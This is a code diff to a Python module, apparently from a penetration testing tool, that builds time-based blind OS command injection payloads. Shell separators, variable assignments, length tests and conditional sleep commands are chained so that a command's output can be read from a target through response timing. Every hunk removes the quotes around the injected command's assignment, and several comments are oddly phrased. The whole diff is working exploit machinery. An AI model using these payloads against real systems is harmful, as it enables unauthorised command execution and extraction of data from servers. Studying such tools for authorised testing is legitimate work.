@@ -373,7 +373,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       payload = (separator +
                  # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                  settings.BYTE_LOCALE_EXPORTED + separator +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
@@ -384,7 +384,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
                  settings.BYTE_LOCALE_EXPORTED + "&&" +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + "&&" +
                  "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                 )
@@ -394,7 +394,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       payload = (ampersand +
                  # The command the "&&" needs on its left, pinning while it is there.
                  settings.BYTE_LOCALE_EXPORTED + separator +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
@@ -465,7 +465,7 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
       payload = (separator +
                  # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
                  settings.BYTE_LOCALE_EXPORTED + separator +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "sleep $((" + str(timesec) + "*(" + str(candidate_length) + "<=$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                 )
@@ -476,7 +476,7 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
       # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
                  settings.BYTE_LOCALE_EXPORTED + "&&" +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + "&&" +
                  "[ " + str(candidate_length) + " -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                 )
@@ -486,7 +486,7 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
       payload = (ampersand +
                  # The command the "&&" needs on its left, pinning while it is there.
                  settings.BYTE_LOCALE_EXPORTED + separator +
-                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "[ " + str(candidate_length) + " -le $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
@@ -571,7 +571,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Sliced in bytes, as the length beside it counts - exported, since a rewrite can move the counting into a command of its own.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 # Grab the execution output.
-                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_term + ")))"
@@ -584,7 +584,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
       # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
                 settings.BYTE_LOCALE_EXPORTED + "&&" +
-                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + word + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + "&&" +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ]" + "&&" +
@@ -597,7 +597,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # The command the "&&" needs on its left, pinning while it is there.
                 settings.BYTE_LOCALE_EXPORTED + separator +
                 # Grab the execution output.
-                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                 # Perform the time-based comparisons
